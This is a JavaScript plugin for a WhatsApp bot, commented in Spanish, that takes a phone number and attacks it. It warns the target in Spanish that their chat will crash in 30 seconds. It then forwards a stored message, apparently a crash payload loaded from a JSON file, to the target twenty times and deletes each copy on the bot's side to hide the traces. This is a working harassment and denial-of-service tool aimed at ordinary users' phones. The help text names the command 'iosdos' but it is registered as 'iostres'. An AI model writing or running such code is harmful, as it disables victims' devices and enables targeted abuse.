import fs from 'fs';

const FILE_PATH = './mensajes_guardados.json';

function wait(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

let handler = async (m, { conn, args }) => {
  try {
    if (!args[0]) return m.reply('❌ Debes proporcionar un número. Ejemplo:\n*.iosdos +55425277552*');

    const normalize = jid => jid.replace(/\D/g, '') + '@s.whatsapp.net';
    const targetJid = normalize(args[0]);

    // Solo el número del bot puede usarlo
    if (m.sender !== conn.user.jid) {
      return m.reply('❌ Solo el número del bot puede usar este comando.');
    }

    // ⚠️ Mensaje de advertencia
    await conn.sendMessage(targetJid, {
      text: '🚨 Hey salte del chat o te dará crash. Tienes 30 segundos.',
    });

    // ⏳ Espera 30 segundos
    setTimeout(async () => {
      if (!fs.existsSync(FILE_PATH)) return m.reply('❌ No hay mensaje guardado.');
      const mensaje = JSON.parse(fs.readFileSync(FILE_PATH, 'utf-8'));
      if (!mensaje?.message) return m.reply('❌ El archivo está dañado o incompleto.');

      for (let i = 0; i < 20; i++) {
        const reenviado = await conn.copyNForward(targetJid, mensaje, true);

        // Eliminar localmente solo para el bot
        await conn.sendMessage(conn.user.id, {
          delete: {
            remoteJid: targetJid,
            fromMe: true,
            id: reenviado.key.id,
            participant: conn.user.id
          }
        });

        await wait(500); // Pequeña pausa para evitar spam explosivo
      }

      await conn.sendMessage(m.chat, {
        text: `✅ Los 20 mensajes fueron enviados correctamente a ${args[0]}.`
      }, { quoted: m });

    }, 30000); // 30 segundos de espera

  } catch (e) {
    console.error('[ERROR iosdos]:', e);
    return m.reply('❌ Error:\n' + (e.message || e));
  }
};

handler.command = ['iostres'];
export default handler;